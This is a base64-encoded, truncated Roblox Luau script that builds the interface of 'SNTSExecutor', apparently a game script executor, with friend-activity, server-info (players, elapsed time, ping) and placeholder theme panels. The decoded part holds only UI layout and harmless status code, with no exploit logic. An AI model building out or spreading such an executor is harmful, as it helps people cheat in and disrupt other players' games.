b25TZXJ2aWNlOkFkZFRhZyhHMkxbIjZlIl0sIFtbVUlTY2FsZVJ1bnRpbWVPYmplY3RdXSk7CgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLkZyaWVuZEFjdGl2aXR5CkcyTFsiNmYiXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiMWEiXSk7CkcyTFsiNmYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjZmIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjZmIl1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly83OTc1ODE3OTc4NzMyNV1dOwpHMkxbIjZmIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNzAsIDAsIDQ4OSk7CkcyTFsiNmYiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI2ZiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjZmIl1bIk5hbWUiXSA9IFtbRnJpZW5kQWN0aXZpdHldXTsKRzJMWyI2ZiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMjAwMDEsIDAsIDAuNDYzMjcsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuRnJpZW5kQWN0aXZpdHkuRGlzcGxheU5hbWUKRzJMWyI3MCJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjZmIl0pOwpHMkxbIjcwIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI3MCJdWyJUZXh0U2l6ZSJdID0gMjU7CkcyTFsiNzAiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNzAiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI3MCJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI3MCJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjcwIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyI3MCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjcwIl1bIlRleHQiXSA9IFtbRnJpZW5kIEFjdGl2aXR5XV07CkcyTFsiNzAiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjcwIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wNjMyOCwgMCwgMC4wMTc3NiwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5GcmllbmRBY3Rpdml0eS5TY3JvbGxpbmdGcmFtZQpHMkxbIjcxIl0gPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgRzJMWyI2ZiJdKTsKRzJMWyI3MSJdWyJBY3RpdmUiXSA9IHRydWU7CkcyTFsiNzEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjcxIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjcxIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzMDEsIDAsIDM0NSk7CkcyTFsiNzEiXVsiU2Nyb2xsQmFySW1hZ2VDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI0MSwgMjQxLCAyNDEpOwpHMkxbIjcxIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wOTE4OSwgMCwgMC4xNzM4MiwgMCk7CkcyTFsiNzEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI3MSJdWyJTY3JvbGxCYXJUaGlja25lc3MiXSA9IDU7CkcyTFsiNzEiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLkZyaWVuZEFjdGl2aXR5LlVJR3JhZGllbnQKRzJMWyI3MiJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyI2ZiJdKTsKRzJMWyI3MiJdWyJSb3RhdGlvbiJdID0gLTkwOwpHMkxbIjcyIl1bIkNvbG9yIl0gPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMDAwLCBDb2xvcjMuZnJvbVJHQig1OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjYxOCwgQ29sb3IzLmZyb21SR0IoMTIwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk5NywgQ29sb3IzLmZyb21SR0IoMTk4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSl9OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuRnJpZW5kQWN0aXZpdHkuVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQKRzJMWyI3MyJdID0gSW5zdGFuY2UubmV3KCJVSUFzcGVjdFJhdGlvQ29uc3RyYWludCIsIEcyTFsiNmYiXSk7CkcyTFsiNzMiXVsiQXNwZWN0UmF0aW8iXSA9IDAuNzU2NjU7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5GcmllbmRBY3Rpdml0eS5VSVNjYWxlCkcyTFsiNzQiXSA9IEluc3RhbmNlLm5ldygiVUlTY2FsZSIsIEcyTFsiNmYiXSk7CgotLSBBdHRyaWJ1dGVzCkcyTFsiNzQiXTpTZXRBdHRyaWJ1dGUoW1tSZXNvbHV0aW9uXV0sIFZlY3RvcjIubmV3KDE5MTksIDEwODApKTsKCi0tIFRhZ3MKQ29sbGVjdGlvblNlcnZpY2U6QWRkVGFnKEcyTFsiNzQiXSwgW1tVSVNjYWxlUnVudGltZU9iamVjdF1dKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5TZXJ2ZXIKRzJMWyI3NSJdID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgRzJMWyIxYSJdKTsKRzJMWyI3NSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiNzUiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNzUiXVsiSW1hZ2UiXSA9IFtbcmJ4YXNzZXRpZDovLzExMDM3NjMzMTAyMDUyNF1dOwpHMkxbIjc1Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNzAsIDAsIDIyOCk7CkcyTFsiNzUiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI3NSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjc1Il1bIk5hbWUiXSA9IFtbU2VydmVyXV07CkcyTFsiNzUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjIwMDAxLCAwLCAwLjI2MDA4LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlNlcnZlci5GcmFtZQpHMkxbIjc2Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyI3NSJdKTsKRzJMWyI3NiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiNzYiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiNzYiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDEwMCwgMCwgNTApOwpHMkxbIjc2Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC42Mzc4NiwgMCwgMC4yNDMzMywgMCk7CkcyTFsiNzYiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlNlcnZlci5GcmFtZS5VSUNvcm5lcgpHMkxbIjc3Il0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyI3NiJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5TZXJ2ZXIuRnJhbWUKRzJMWyI3OCJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiNzUiXSk7CkcyTFsiNzgiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjc4Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbIjc4Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxMDAsIDAsIDUwKTsKRzJMWyI3OCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNjM3ODYsIDAsIDAuNDg5NzgsIDApOwpHMkxbIjc4Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5TZXJ2ZXIuRnJhbWUuVUlDb3JuZXIKRzJMWyI3OSJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiNzgiXSk7CgoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuU2VydmVyLlNlcnZlclRleHQKRzJMWyI3YSJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjc1Il0pOwpHMkxbIjdhIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI3YSJdWyJUZXh0U2l6ZSJdID0gMjU7CkcyTFsiN2EiXVsiVGV4dFhBbGlnbm1lbnQiXSA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKRzJMWyI3YSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI3YSJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjdhIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjdhIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiN2EiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDIwMCwgMCwgNTApOwpHMkxbIjdhIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiN2EiXVsiVGV4dCJdID0gW1tTZXJ2ZXJdXTsKRzJMWyI3YSJdWyJOYW1lIl0gPSBbW1NlcnZlclRleHRdXTsKRzJMWyI3YSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDk1NzEsIDAsIDAuMDI2MDUsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuU2VydmVyLlBsYXllcnNUZXh0CkcyTFsiN2IiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyI3NSJdKTsKRzJMWyI3YiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiN2IiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbIjdiIl1bIlRleHRYQWxpZ25tZW50Il0gPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CkcyTFsiN2IiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiN2IiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI3YiJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI3YiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjdiIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyI3YiJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjdiIl1bIlRleHQiXSA9IFtbUGxheWVyczpdXTsKRzJMWyI3YiJdWyJOYW1lIl0gPSBbW1BsYXllcnNUZXh0XV07CkcyTFsiN2IiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjA5NTcxLCAwLCAwLjI0NSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5TZXJ2ZXIuRWxhcHNlZFRleHQKRzJMWyI3YyJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjc1Il0pOwpHMkxbIjdjIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI3YyJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiN2MiXVsiVGV4dFhBbGlnbm1lbnQiXSA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKRzJMWyI3YyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI3YyJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjdjIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjdjIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiN2MiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDIwMCwgMCwgNTApOwpHMkxbIjdjIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiN2MiXVsiVGV4dCJdID0gW1tFbGFwc2VkOl1dOwpHMkxbIjdjIl1bIk5hbWUiXSA9IFtbRWxhcHNlZFRleHRdXTsKRzJMWyI3YyJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDk1NzEsIDAsIDAuMzgwODgsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuU2VydmVyLlBpbmdUZXh0CkcyTFsiN2QiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyI3NSJdKTsKRzJMWyI3ZCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiN2QiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbIjdkIl1bIlRleHRYQWxpZ25tZW50Il0gPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CkcyTFsiN2QiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiN2QiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI3ZCJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI3ZCJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjdkIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyI3ZCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjdkIl1bIlRleHQiXSA9IFtbUGluZzpdXTsKRzJMWyI3ZCJdWyJOYW1lIl0gPSBbW1BpbmdUZXh0XV07CkcyTFsiN2QiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjA5NTcxLCAwLCAwLjUxNjc2LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlNlcnZlci5VSUdyYWRpZW50CkcyTFsiN2UiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiNzUiXSk7CkcyTFsiN2UiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyI3ZSJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlNlcnZlci5VSUFzcGVjdFJhdGlvQ29uc3RyYWludApHMkxbIjdmIl0gPSBJbnN0YW5jZS5uZXcoIlVJQXNwZWN0UmF0aW9Db25zdHJhaW50IiwgRzJMWyI3NSJdKTsKRzJMWyI3ZiJdWyJBc3BlY3RSYXRpbyJdID0gMS42MjI4MTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlNlcnZlci5VSVNjYWxlCkcyTFsiODAiXSA9IEluc3RhbmNlLm5ldygiVUlTY2FsZSIsIEcyTFsiNzUiXSk7CgotLSBBdHRyaWJ1dGVzCkcyTFsiODAiXTpTZXRBdHRyaWJ1dGUoW1tSZXNvbHV0aW9uXV0sIFZlY3RvcjIubmV3KDE5MTksIDEwODApKTsKCi0tIFRhZ3MKQ29sbGVjdGlvblNlcnZpY2U6QWRkVGFnKEcyTFsiODAiXSwgW1tVSVNjYWxlUnVudGltZU9iamVjdF1dKTsKCi0tLy8gU2VydmljZXMKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFRlbGVwb3J0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIikKbG9jYWwgU3RhdHMgPSBnYW1lOkdldFNlcnZpY2UoIlN0YXRzIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIEh0dHBTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpCgpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCi0tLy8gVUkgUmVmZXJlbmNlcwpsb2NhbCBGcmllbmRBY3Rpdml0eUZyYW1lID0gRzJMWyI3MSJdIC0tIFNjcm9sbGluZ0ZyYW1lIChGcmllbmRBY3Rpdml0eSkKbG9jYWwgUGxheWVyc1RleHQgPSBHMkxbIjdiIl0KbG9jYWwgRWxhcHNlZFRleHQgPSBHMkxbIjdjIl0KbG9jYWwgUGluZ1RleHQgPSBHMkxbIjdkIl0KCi0tLy8gQ2xlYXIgZnJpZW5kIGxpc3QKZm9yIF8sIGNoaWxkIGluIGlwYWlycyhGcmllbmRBY3Rpdml0eUZyYW1lOkdldENoaWxkcmVuKCkpIGRvCglpZiBjaGlsZDpJc0EoIkZyYW1lIikgb3IgY2hpbGQ6SXNBKCJUZXh0QnV0dG9uIikgdGhlbgoJCWNoaWxkOkRlc3Ryb3koKQoJZW5kCmVuZAoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLS8vIFNFUlZFUiBJTkZPIFNFQ1RJT04KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKbG9jYWwgc3RhcnRUaW1lID0gb3MuY2xvY2soKQoKbG9jYWwgZnVuY3Rpb24gVXBkYXRlU2VydmVySW5mbygpCgktLSBQbGF5ZXIgY291bnQKCWxvY2FsIHBsYXllckNvdW50ID0gI1BsYXllcnM6R2V0UGxheWVycygpCglQbGF5ZXJzVGV4dC5UZXh0ID0gIlBsYXllcnM6ICIgLi4gcGxheWVyQ291bnQKCgktLSBFbGFwc2VkIHRpbWUKCWxvY2FsIGVsYXBzZWQgPSBtYXRoLmZsb29yKG9zLmNsb2NrKCkgLSBzdGFydFRpbWUpCglsb2NhbCBtaW51dGVzID0gbWF0aC5mbG9vcihlbGFwc2VkIC8gNjApCglsb2NhbCBzZWNvbmRzID0gZWxhcHNlZCAlIDYwCglFbGFwc2VkVGV4dC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiRWxhcHNlZDogJTAyZDolMDJkIiwgbWludXRlcywgc2Vjb25kcykKCgktLSBQaW5nIChuZXR3b3JrIGxhdGVuY3kpCglsb2NhbCBwaW5nU3RhdCA9IFN0YXRzLk5ldHdvcmsuU2VydmVyU3RhdHNJdGVtWyJEYXRhIFBpbmciXQoJbG9jYWwgcGluZ1ZhbHVlID0gcGluZ1N0YXQgYW5kIG1hdGguZmxvb3IocGluZ1N0YXQ6R2V0VmFsdWUoKSkgb3IgMAoJUGluZ1RleHQuVGV4dCA9ICJQaW5nOiAiIC4uIHBpbmdWYWx1ZSAuLiAiIG1zIgplbmQKClJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoVXBkYXRlU2VydmVySW5mbykKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncwpHMkxbIjgxIl0gPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIsIEcyTFsiMSJdKTsKRzJMWyI4MSJdWyJOYW1lIl0gPSBbW1NldHRpbmdzXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzCkcyTFsiODIiXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiODEiXSk7CkcyTFsiODIiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjgyIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjgyIl1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly83OTc1ODE3OTc4NzMyNV1dOwpHMkxbIjgyIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNzAsIDAsIDQ4OSk7CkcyTFsiODIiXVsiVmlzaWJsZSJdID0gZmFsc2U7CkcyTFsiODIiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI4MiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjgyIl1bIk5hbWUiXSA9IFtbVGhlbWVzXV07CkcyTFsiODIiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjIwMDAxLCAwLCAwLjQ2MzI3LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuVGhlbWVzVGV4dApHMkxbIjgzIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiODIiXSk7CkcyTFsiODMiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjgzIl1bIlRleHRTaXplIl0gPSAyNTsKRzJMWyI4MyJdWyJUZXh0WEFsaWdubWVudCJdID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwpHMkxbIjgzIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjgzIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiODMiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiODMiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyI4MyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiODMiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI4MyJdWyJUZXh0Il0gPSBbW1RoZW1lcyAoQ29taW5nIFNvb24pXV07CkcyTFsiODMiXVsiTmFtZSJdID0gW1tUaGVtZXNUZXh0XV07CkcyTFsiODMiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjA5ODQyLCAwLCAwLjAyNzk4LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuVUlHcmFkaWVudApHMkxbIjg0Il0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbIjgyIl0pOwpHMkxbIjg0Il1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiODQiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3e0NvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4wMDAsIENvbG9yMy5mcm9tUkdCKDU4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjI2MSwgQ29sb3IzLmZyb21SR0IoODAsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNjE4LCBDb2xvcjMuZnJvbVJHQigxMjAsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuOTg4LCBDb2xvcjMuZnJvbVJHQigxNzEsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuOTk3LCBDb2xvcjMuZnJvbVJHQigxOTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEuMDAwLCBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApKX07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lCkcyTFsiODUiXSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiLCBHMkxbIjgyIl0pOwpHMkxbIjg1Il1bIkFjdGl2ZSJdID0gdHJ1ZTsKRzJMWyI4NSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiODUiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsID